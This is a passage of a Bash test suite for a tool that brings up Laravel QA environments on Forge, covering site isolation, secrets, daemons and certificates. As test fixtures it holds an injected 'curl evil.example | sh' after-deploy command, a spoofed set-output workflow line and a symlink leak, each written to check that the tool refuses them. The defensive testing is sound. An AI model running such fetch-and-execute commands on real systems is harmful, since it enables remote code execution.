  forge_set '.sites[0].remove_reads = -1'
  up
  expect_rc 1; expect_err_has "environment 7 was brought up as $(old_web_host 7)"
  expect_true "the run waited before it refused" lacks "$out" "waiting for it to go"
  run forge_writes; expect_out ""
  # An app with no frontend of its own comes up at its one host.
  app $'[app]\nname = "shop"\n\n[qa]\nzone = "qa.example.dev"\n\n[qa.parity]\nbroadcast = "log"\nmail = "log"\nfiles = "local"' artisan=php
  site 53 "$(old_api_host 7)" installed
  up
  expect_rc 1; expect_err_has "and the next deploy brings it up as $API"
  # One Forge is still removing, as a teardown leaves it, is waited for, and the environment comes up under the new
  # names.
  app "$TWO" api/artisan=php
  site 52 "$(old_api_host 7)" removing "$(ago 86400)" "$(ago 60)"
  forge_set '.sites[-1].remove_reads = 5'
  up
  expect_rc 0; expect_out_has "$(old_api_host 7) is still being removed; waiting for it to go"
  expect_out_has "environment 7: up at https://$WEB"
  run state '[.sites[].name] | join(",")'; expect_out "$API,$WEB"
  # A look at the environment's sites that fails stops the run, before anything is made.
  app "$TWO" api/artisan=php
  forge_set '.fail["GET /sites"] = 500'
  up
  expect_rc 1; expect_err_has "Forge's site $API could not be read"
  run forge_writes; expect_out ""
  run gate_log; expect_out ""
}

t_an_environment_of_the_old_names_holds_a_slot() {
  app "$TWO" api/artisan=php
  site 1 "$(api_host 1)" installed
  site 2 "$(web_host 2)" installed
  site 3 "$(old_api_host 3)" installed
  up
  expect_rc 0; expect_out_has "::warning::All 3 QA environments are in use, so this pull request waits for a slot."
  run forge_writes; expect_out ""
}

t_a_site_that_is_not_isolated_or_of_another_user_is_refused() {
  app "$TWO" api/artisan=php
  site 5 "$API" installed
  forge_set '.sites[-1] += {user: "forge", isolated: false}'
  up
  expect_rc 1; expect_err_has "$API is not a Forge isolated site of the user shop_qa_7; delete it in Forge and run again"
  run gate_log; expect_out ""
  run gh_log; expect_out_has 'mroom-qa: failed'
  # Isolated, but another environment's user.
  forge_set '.sites[-1] += {user: "shop_qa_8", isolated: true}'
  up
  expect_rc 1; expect_err_has "is not a Forge isolated site of the user shop_qa_7"
  run gate_log; expect_out ""
}

t_the_reverb_app_keeps_its_secret_from_deploy_to_deploy() {
  app "$TWO" api/artisan=php
  up
  expect_rc 0; expect_out_has "==> Reverb app"
  run grep -c -x "REVERB_APP_SECRET=reverb-pw-7-1" "$GATE/env-put.in"; expect_out 1
  # Each deploy asks for the app again, and gets the same secret, so open sockets keep their private channels.
  up
  expect_rc 0
  run grep -c -x "REVERB_APP_SECRET=reverb-pw-7-1" "$GATE/env-put.in"; expect_out 1
  run grep -c -x "reverb-app-add 7" "$GATE/gate.log"; expect_out 2
  # Nothing removes it first, which would give it a new secret, and the .env goes through the gate alone.
  run gate_log; expect_true "a deploy removed the Reverb app" lacks "$out" "reverb-app-remove"
  run forge_writes; expect_true "a deploy wrote the .env through Forge" lacks "$out" "/environment"
}

t_the_gates_reverb_app_is_the_one_the_frontend_was_built_for() {
  local right pair
  right="REVERB_APP_ID=$(reverb_app 7)
REVERB_APP_KEY=$(reverb_app 7)
REVERB_APP_SECRET=reverb-pw-x
REVERB_HOST=ws.qa.example.dev
REVERB_PORT=443
REVERB_SCHEME=https"
  app "$TWO" api/artisan=php
  printf '%s\n' "$right" >"$GATE/reverb-app-add.out"
  up
  expect_rc 0
  # box.env names the app or the zone otherwise than mroom.toml, or the gate gives another host: the frontend would
  # open its sockets for another app, or on another host. Nothing is written.
  for pair in "REVERB_APP_ID=$(reverb_app 8)" "REVERB_APP_KEY=$(reverb_app 8)" REVERB_HOST=ws.qa.other.example.dev \
    REVERB_PORT=8080 REVERB_SCHEME=http; do
    app "$TWO" api/artisan=php
    awk -F= -v pair="$pair" '$1 == substr(pair, 1, index(pair, "=") - 1) { print pair; next } { print }' <<<"$right" \
      >"$GATE/reverb-app-add.out"
    up
    expect_rc 1
    expect_err_has "the gate's Reverb app has another ${pair%%=*} than"
    expect_no_file "$GATE/env-put.in"
  done
  expect_err_has "than https, which mroom.toml gives for the frontend: box.env's MROOM_APP_NAME and MROOM_QA_ZONE must be mroom.toml's app.name and qa.zone, and the box must run the mroom release the workflows pin"
  # One the gate cannot give fails the deploy too, and one with no secret.
  app "$TWO" api/artisan=php
  echo 1 >"$GATE/reverb-app-add.rc"
  up
  expect_rc 1; expect_err_has "the gate could not give the environment its Reverb app (reverb-app-add)"
  expect_no_file "$GATE/env-put.in"
  app "$TWO" api/artisan=php
  grep -v '^REVERB_APP_SECRET=' <<<"$right" >"$GATE/reverb-app-add.out"
  up
  expect_rc 1; expect_err_has "the gate gave no REVERB_APP_SECRET"
}

t_broadcast_log_asks_for_no_reverb_app() {
  app "$TWO"$'\n\n[qa.parity]\nbroadcast = "log"' api/artisan=php
  up
  expect_rc 0
  run gate_log; expect_true "a Reverb app was asked for" lacks "$out" "reverb-app"
  local sent
  sent="$(env_sent)"
  expect_true ".env lacks BROADCAST_CONNECTION=log" has_line "$sent" BROADCAST_CONNECTION=log
  expect_true ".env lacks BROADCAST_DRIVER=log" has_line "$sent" BROADCAST_DRIVER=log
  run grep -c -e '^REVERB_APP_KEY=' -e '^REVERB_APP_ID=' -e '^VITE_REVERB_APP_KEY=' <<<"$sent"; expect_out 0
}

t_vite_gets_the_reverb_values_only_with_a_frontend() {
  local sent
  # Vite inside the Laravel app: the values it was built with.
  app $'[app]\nname = "shop"\n\n[qa]\nzone = "qa.example.dev"\n\n[qa.parity]\nmail = "log"\nfiles = "local"' artisan=php
  up
  expect_rc 0
  sent="$(env_sent)"
  expect_true ".env lacks REVERB_APP_KEY" has_line "$sent" "REVERB_APP_KEY=$(reverb_app 7)"
  expect_true ".env lacks VITE_REVERB_APP_KEY" has_line "$sent" "VITE_REVERB_APP_KEY=$(reverb_app 7)"
  expect_true ".env lacks VITE_REVERB_HOST" has_line "$sent" VITE_REVERB_HOST=ws.qa.example.dev
  # No frontend: no Vite values of mroom's, and the template's line stays as it was.
  app $'[app]\nname = "shop"\nfrontend_dir = ""\n\n[qa]\nzone = "qa.example.dev"\n\n[qa.parity]\nmail = "log"\nfiles = "local"' artisan=php
  up
  expect_rc 0
  sent="$(env_sent)"
  expect_true ".env lacks REVERB_APP_KEY" has_line "$sent" "REVERB_APP_KEY=$(reverb_app 7)"
  run grep -c -e '^VITE_REVERB_APP_KEY=' -e '^VITE_REVERB_PORT=' -e '^VITE_REVERB_SCHEME=' <<<"$sent"; expect_out 0
  expect_true "the template's Vite line changed" has_line "$sent" 'VITE_REVERB_HOST="${REVERB_HOST}"'
}

t_a_build_with_a_link_is_refused_before_anything_is_made() {
  app "$TWO" api/artisan=php
  ln -s /etc/hostname "$T/dist/assets/leak.txt"
  up
  expect_rc 1; expect_err_has "the frontend build holds something other than files and folders"
  run forge_writes; expect_out ""
  rm "$T/dist/assets/leak.txt" "$T/dist/index.html"
  up
  expect_rc 1; expect_err_has "the frontend build has no index.html"
  run forge_writes; expect_out ""
}

t_daemons_of_another_user_go_before_the_code() {
  app "$TWO" api/artisan=php
  process 50 forge "/home/shop_qa_7/$API/api"
  up
  expect_rc 0; expect_out_has "deleted daemon 50, which ran as forge"
  run order; expect_out_has $'forge DELETE /background-processes/50\ngate probe-link 7 api\ngate probe-link 7 web\ngate code-put 7'
  run state '[.processes[].user] | join(",")'; expect_out "shop_qa_7"
  # One that does not go keeps the code out.
  app "$TWO" api/artisan=php
  process 50 root "/home/shop_qa_7/$API/api"
  forge_set '.process_remove_reads = -1'
  export MROOM_QA_DAEMON_WAIT=10
  up
  expect_rc 1; expect_err_has "daemons of the environment still run as another user 10s after they were deleted, so no code goes in"
  run gate_log; expect_out ""
  # A delete Forge refuses is said as it is.
  app "$TWO" api/artisan=php
  process 50 forge "/home/shop_qa_7/$API/api"
  forge_set '.fail["DELETE /background-processes/50"] = 500'
  up
  expect_rc 1; expect_err_has "Forge would not delete daemon 50, which runs as forge, so no code goes in"
  expect_true "a refused delete was reported as done" lacks "$out" "deleted daemon 50"
  run gate_log; expect_out ""
}

t_daemons_and_scheduled_jobs_found_by_their_command_go_too() {
  app "$TWO" api/artisan=php
  made_site 40 7 api /api/public 8.4
  made_site 41 7 web /
  # forge's own daemon, from forge's home, that runs the site's artisan; a scheduled job of the server's, as root,
  # that runs it too; one of the api site's own, as forge, that runs it as well. Kept: environment 17's,
  # which name its own home and site, and the site user's own.
  process 50 forge /home/forge running "php8.4 /home/shop_qa_7/$API/api/artisan horizon"
  process 51 forge /home/forge running "php8.4 /home/shop_qa_17/$(api_host 17)/api/artisan horizon"
  job 60 root "php8.4 /home/shop_qa_7/$API/api/artisan schedule:run"
  job 61 forge "php8.4 /home/shop_qa_17/$(api_host 17)/api/artisan schedule:run"
  job 62 shop_qa_7 "php8.4 /home/shop_qa_7/$API/api/artisan schedule:run"
  job 63 forge "php8.4 /home/shop_qa_7/$API/api/artisan schedule:run" 40
  job 64 shop_qa_7 "php artisan schedule:run" 41
  # Forge's list of the server's scheduled jobs may hold the sites' own too, which a delete through the server's path
  # misses: they go through their site's. A job or daemon that only asks a site for a page names no folder of it, and
  # stays; one that runs from a folder named after a site is that site's.
  forge_set '.server_lists_site_jobs = true'
  job 65 forge "curl -fsS https://$API/up"
  process 52 forge "/var/www/$WEB" running "php artisan inspire"
  process 53 forge /home/forge running "curl -s https://$WEB/"
  up
  expect_rc 0
  expect_out_has "deleted daemon 52, which ran as forge"
  expect_out_has "deleted daemon 50, which ran as forge"
  expect_out_has "deleted scheduled job 60, which ran as root"
  expect_out_has "deleted scheduled job 63, which ran as forge"
  run order
  expect_out_has $'forge DELETE /background-processes/50\nforge DELETE /background-processes/52\nforge DELETE /scheduled-jobs/60\nforge DELETE /sites/40/scheduled-jobs/63'
  expect_out_has $'forge DELETE /sites/40/scheduled-jobs/63\ngate probe-link 7 api'
  run state '[.processes[].id] | map(tostring) | join(",")'; expect_out "51,53,104"
  run state '[.jobs[].id] | map(tostring) | join(",")'; expect_out "61,62,65"
  run state '[.sites[] | .jobs // [] | .[].id] | map(tostring) | join(",")'; expect_out "64"
  # One Forge never finishes deleting keeps the code out, and one it will not delete is said as it is.
  app "$TWO" api/artisan=php
  job 60 root "php8.4 /home/shop_qa_7/$API/api/artisan schedule:run"
  forge_set '.job_remove_reads = -1'
  export MROOM_QA_DAEMON_WAIT=10
  up
  expect_rc 1; expect_err_has "scheduled jobs of the environment still run as another user 10s after they were deleted, so no code goes in"
  run gate_log; expect_out ""
  run grep -c '^DELETE /scheduled-jobs/60$' "$FORGE_LOG"; expect_out 1
  app "$TWO" api/artisan=php
  job 60 root "php8.4 /home/shop_qa_7/$API/api/artisan schedule:run"
  forge_set '.fail["DELETE /scheduled-jobs/60"] = 500'
  up
  expect_rc 1; expect_err_has "Forge would not delete scheduled job 60, which runs as root, so no code goes in"
  run gate_log; expect_out ""
}

t_a_daemon_that_turns_up_during_the_deploy_keeps_the_worker_out() {
  app "$TWO" api/artisan=php
  forge_set ".deploy_adds_process = {user: \"forge\", directory: \"/home/forge\", status: \"running\", processes: 1,
    command: \"php8.4 /home/shop_qa_7/$API/api/artisan queue:work\"}"
  up
  expect_rc 1; expect_err_has "a daemon of the environment runs as another user again, so the worker waits"
  run forge_writes; expect_true "a worker was made beside it" lacks "$out" "POST /background-processes"
  run output_of sha; expect_out ""
  run gh_log; expect_out_has "mroom-qa: failed"
}

t_two_first_deploys_at_once_never_pass_max_envs() {
  local other
  other="{name: \"$(api_host 8)\", type: \"php\", is_isolated: true, isolated_user: \"$(site_user 8)\",
    web_directory: \"/api/public\", php_version: \"php84\"}"
  app "$TWO" api/artisan=php
  site 1 "$(api_host 1)" installed
  site 2 "$(api_host 2)" installed
  # Environment 8's first deploy also counted 2 of 3, and made its site just before this one's: this one gives way.
  forge_set ".sites_made_first = [$other]"
  up
  expect_rc 0
  expect_out_has "site 102 gave way, past qa.max_envs"
  expect_out_has "::warning::All 3 QA environments are in use, so this pull request waits for a slot."
  run forge_writes; expect_out_has $'\nDELETE /sites/102'
  # Its site is gone, waited for until Forge had it gone.
  run state '[.sites[].id] | map(tostring) | join(",")'; expect_out "1,2,101"
  run gate_log; expect_out ""
  run output_of sha; expect_out ""
  run gh_log; expect_out_has 'mroom-qa: waiting since=2026-10-27T12:00:00Z'
  # Made just after this one's, environment 8 is the one past qa.max_envs: this one goes on.
  app "$TWO" api/artisan=php
  site 1 "$(api_host 1)" installed
  site 2 "$(api_host 2)" installed
  forge_set ".sites_made_after = [$other]"
  up
  expect_rc 0; expect_out_has "environment 7: up at https://$WEB"
}

t_a_worker_forge_runs_as_another_user_is_deleted() {
  app "$TWO" api/artisan=php
  forge_set '.process_user = "forge"'
  up
  expect_rc 1; expect_err_has "Forge started the queue worker as forge, not shop_qa_7, so it was deleted again"
  run state '.processes | length'; expect_out 0
  # A worker Forge refuses, as it refuses a user it does not know, is said so.
  app "$TWO" api/artisan=php
  forge_set '.fail["POST /background-processes"] = 422'
  up
  expect_rc 1; expect_err_has "Forge refused the queue worker, run as shop_qa_7 (design D17)"
  # One Forge started as another user and will not delete is left to a person, by its id.
  app "$TWO" api/artisan=php
  forge_set '.process_user = "forge" | .fail["DELETE /background-processes/106"] = 500'
  up
  expect_rc 1; expect_err_has "Forge started the queue worker as forge, not shop_qa_7, and would not delete it: delete daemon 106 in Forge"
}

t_a_failed_deploy_shows_its_output_but_runs_no_command() {
  app "$TWO" api/artisan=php
  forge_set '.deploy_result = "failed" | .deploy_log = "composer: done\n::set-output name=app_url::https://evil.example\nPHP Fatal error"'
  up
  expect_rc 1; expect_err_has "Forge's deploy 105 of $API ended failed"
  local token first
  token="$(sed -n 's/^::stop-commands:://p' <<<"$out")"
  expect_true "no stop-commands token" [ -n "$token" ]
  expect_true "the stop-commands token is not 32 hex characters" eval '[[ "$token" =~ ^[0-9a-f]{32}$ ]]'
  expect_out_has $'::stop-commands::'"$token"$'\ncomposer: done\n::set-output name=app_url::https://evil.example\nPHP Fatal error\n::'"$token"'::'
  run state '.processes | length'; expect_out 0
  run gh_log; expect_out_has "The deploy of \`$SHA\` failed: Forge's deploy 105 of $API ended failed"
  # A token of its own each time, so the output cannot end it with one it saw before.
  first="$token"
  up
  token="$(sed -n 's/^::stop-commands:://p' <<<"$out")"
  expect_true "the stop-commands token was the same twice" [ "$token" != "$first" ]
}

t_up_is_asked_again_after_a_502_and_fails_when_it_stays_down() {
  app "$TWO" api/artisan=php
  printf '502\n000\n200\n' >"$FORGE_UP"
  up
  expect_rc 0
  run cat "$FORGE_UP.log"; expect_out $'502\n000\n200'
  printf '502\n' >"$FORGE_UP"
  : >"$FORGE_UP.log"
  : >"$T/sleep.log"
  : >"$GITHUB_OUTPUT"
  export MROOM_QA_UP_PAUSE=7
  up
  expect_rc 1; expect_err_has "https://$API/up answered 502, still, after 6 tries"
  # The commit is said to be deployed only once /up answers, so a follower never takes a broken one for it.
  run output_of sha; expect_out ""
  run output_of app_url; expect_out ""
  run grep -c . "$FORGE_UP.log"; expect_out 6
  # Five pauses between the six tries, none after the last.
  run grep -c -x 7 "$T/sleep.log"; expect_out 5
}

t_certificates_are_asked_for_and_a_failed_one_again_once() {
  app "$TWO" api/artisan=php
  # A wildcard certificate to clone, which Forge enables only when asked to: onto the frontend's site, which it
  # names. The API's site is a level below it, so asks Let's Encrypt.
  export MROOM_QA_CERTIFICATE=55
  up
  expect_rc 0
  run grep -c '^POST /sites/103/domains/1030/certificates {"type":"clone","enable":true,"clone":{"certificate_id":55}}$' "$FORGE_LOG"
  expect_out 1
  run grep -c '^POST /sites/101/domains/1010/certificates {"type":"letsencrypt",' "$FORGE_LOG"; expect_out 1
  run grep -c '^POST /sites/[0-9]*/domains/[0-9]*/certificates {"type":"clone"' "$FORGE_LOG"; expect_out 1
  # From Let's Encrypt: one that fails is deleted and asked for again.
  unset MROOM_QA_CERTIFICATE
  app "$TWO" api/artisan=php
  forge_set '.cert_fail = 1'
  up
  expect_rc 0; expect_out_has "deleted certificate 102, which failed"
  run grep -c '^DELETE /sites/101/domains/1010/certificates/102$' "$FORGE_LOG"; expect_out 1
  # Failing twice, it needs a person, and no code goes in.
  app "$TWO" api/artisan=php
  forge_set '.cert_fail = 2'
  up
  expect_rc 1; expect_err_has "the certificate of site 101 failed again; look at it in Forge, then run the deploy again"
  run gate_log; expect_out ""
  # Forge says how it failed after the dash: still failed.
  app "$TWO" api/artisan=php
  forge_set '.cert_fail = 1 | .cert_fail_status = "failed-unknown"'
  up
  expect_rc 0; expect_out_has "deleted certificate 102, which failed"
  # A delete Forge never carries out is waited for, never sent again, until the wait ends.
  app "$TWO" api/artisan=php
  forge_set '.cert_fail = 1 | .cert_remove_reads = 1000'
  export MROOM_QA_CERT_WAIT=10
  up
  expect_rc 1; expect_err_has "site 101 still had the failed certificate 102 it was asked to delete after 10s"
  run grep -c '^DELETE /sites/101/domains/1010/certificates/102$' "$FORGE_LOG"; expect_out 1
  run grep -c '^POST /sites/101/domains/1010/certificates ' "$FORGE_LOG"; expect_out 1
  unset MROOM_QA_CERT_WAIT
  # A clone Forge installed but did not enable is enabled, once.
  app "$TWO" api/artisan=php
  export MROOM_QA_CERTIFICATE=55
  forge_set '.clone_enable_ignored = true'
  up
  expect_rc 0; expect_out_has "enabled certificate 104"
  run grep -c '^POST /sites/103/domains/1030/certificates/104/actions {"action":"enable"}$' "$FORGE_LOG"; expect_out 1
  # One whose enable Forge ignores is waited for, neither enabled again nor asked for anew, until the wait ends.
  app "$TWO" api/artisan=php
  forge_set '.clone_enable_ignored = true | .enable_ignored = true'
  export MROOM_QA_CERT_WAIT=30
  up
  expect_rc 1; expect_err_has "site 103 had no active certificate after 30s"
  run grep -c '^POST /sites/103/domains/1030/certificates/104/actions ' "$FORGE_LOG"; expect_out 1
  run grep -c '^POST /sites/103/domains/1030/certificates ' "$FORGE_LOG"; expect_out 1
}

t_a_site_forge_is_removing_is_waited_for() {
  app "$TWO" api/artisan=php
  site 9 "$API" removing "$(ago 86400)" "$(ago 7200)"
  forge_set '.sites[-1].remove_reads = 2'
  up
  expect_rc 0
  expect_out_has "$API had been removing for 120 minutes; sent the delete again"
  expect_out_has "$API is still being removed; waiting for it to go"
  run state '[.sites[] | "\(.id) \(.name) \(.status)"] | join("\n")'
  expect_out "101 $API installed"$'\n'"103 $WEB installed"
}

t_an_env_the_gate_did_not_write_as_sent_fails() {
  app "$TWO" api/artisan=php
  echo "env=0000000000000000000000000000000000000000000000000000000000000000" >"$GATE/env-put.out"
  up
  expect_rc 1; expect_err_has "the .env the gate wrote is not the one sent"
  run forge_writes; expect_true "a deploy ran" lacks "$out" "/deployments"
}

t_after_deploy_takes_plain_artisan_commands_only() {
  app "${TWO/\"route:cache\"]/\"route:cache\", \"migrate; curl evil.example | sh\"]}" api/artisan=php
  up
  expect_rc 1; expect_err_has "app.build.after_deploy holds a command that is not a plain artisan command: migrate; curl evil.example | sh"
  run forge_writes; expect_out ""
}

t_what_the_comment_says_goes_to_the_status_file_in_the_action() {
  app "$TWO" api/artisan=php
  export MROOM_QA_STATUS="$T/status"
  up
  expect_rc 0
  run head -n1 "$T/status"; expect_out ready
  # The step after it writes the comment, so this run wrote none.
  run grep -c -E '^(PATCH|POST) ' "$GH_FAKE/gh.log"; expect_out 0
  echo 1 >"$GATE/db-create.rc"
  up
  expect_rc 1
  run head -n1 "$T/status"; expect_out failed
  run sed -n 2p "$T/status"; expect_out_has "The deploy of \`$SHA\` failed: the gate could not give the environment its database and role (db-create)"
}

t_usage() {
  app "$TWO"
  run "$UP" 7; expect_rc 2
  run "$UP" 07 "$SHA"; expect_rc 2
  run "$UP" 7 "${SHA:0:12}"; expect_rc 2
  run forge_writes; expect_out ""
}

test_case comes-up t_a_new_environment_comes_up
test_case nginx-applied-later t_nginx_is_guarded_once_forge_applied_it
test_case nginx-guard-in-comment t_a_guard_in_a_comment_or_a_block_does_not_count
test_case nginx-server-block t_a_server_block_that_overrides_the_fragment_keeps_the_code_out
test_case link-served t_a_link_nginx_still_serves_stops_the_deploy
test_case env-values t_the_env_holds_the_environments_own_values
test_case env-entries t_the_template_is_read_entry_by_entry
test_case secrets-off-the-log t_secrets_never_reach_the_log
test_case gate-lines-hidden t_a_gate_line_that_could_hold_a_value_is_never_shown
test_case runner-temp t_scratch_files_go_under_the_runners_temp
test_case refuses-other-users t_the_deploy_script_and_the_worker_refuse_any_other_user
test_case single-app t_a_single_app_gets_its_build_in_the_code
test_case refreshed t_an_existing_environment_is_refreshed
test_case worker-made-again t_a_worker_whose_command_changed_is_made_again
test_case php-mismatch t_a_site_made_with_another_php_is_refused
test_case web-root-elsewhere t_a_site_whose_web_root_is_elsewhere_is_refused
test_case waits-for-a-slot t_a_new_environment_waits_for_a_slot
test_case old-names-up t_an_environment_of_the_old_names_is_torn_down_not_refreshed
test_case old-names-slot t_an_environment_of_the_old_names_holds_a_slot
test_case not-isolated t_a_site_that_is_not_isolated_or_of_another_user_is_refused
test_case reverb-secret-kept t_the_reverb_app_keeps_its_secret_from_deploy_to_deploy
test_case reverb-as-built t_the_gates_reverb_app_is_the_one_the_frontend_was_built_for
test_case broadcast-log t_broadcast_log_asks_for_no_reverb_app
test_case vite-reverb t_vite_gets_the_reverb_values_only_with_a_frontend
test_case build-with-a-link t_a_build_with_a_link_is_refused_before_anything_is_made
test_case daemons-before-code t_daemons_of_another_user_go_before_the_code
test_case jobs-by-command t_daemons_and_scheduled_jobs_found_by_their_command_go_too
test_case daemon-during-deploy t_a_daemon_that_turns_up_during_the_deploy_keeps_the_worker_out
test_case slots-at-once t_two_first_deploys_at_once_never_pass_max_envs
test_case give-way-next-run t_a_site_that_could_not_give_way_gives_way_on_the_next_run
test_case give-way-dropped t_giving_way_outlasts_a_delete_forge_drops
test_case still-making t_a_site_forge_is_still_making_is_new
test_case worker-as-another-user t_a_worker_forge_runs_as_another_user_is_deleted
test_case failed-deploy-output t_a_failed_deploy_shows_its_output_but_runs_no_command
test_case up-asked-again t_up_is_asked_again_after_a_502_and_fails_when_it_stays_down
test_case certificates t_certificates_are_asked_for_and_a_failed_one_again_once
test_case removing-waited-for t_a_site_forge_is_removing_is_waited_for
test_case env-hash t_an_env_the_gate_did_not_write_as_sent_fails
test_case after-deploy-plain t_after_deploy_takes_plain_artisan_commands_only
test_case status-file t_what_the_comment_says_goes_to_the_status_file_in_the_action
test_case usage t_usage
finish
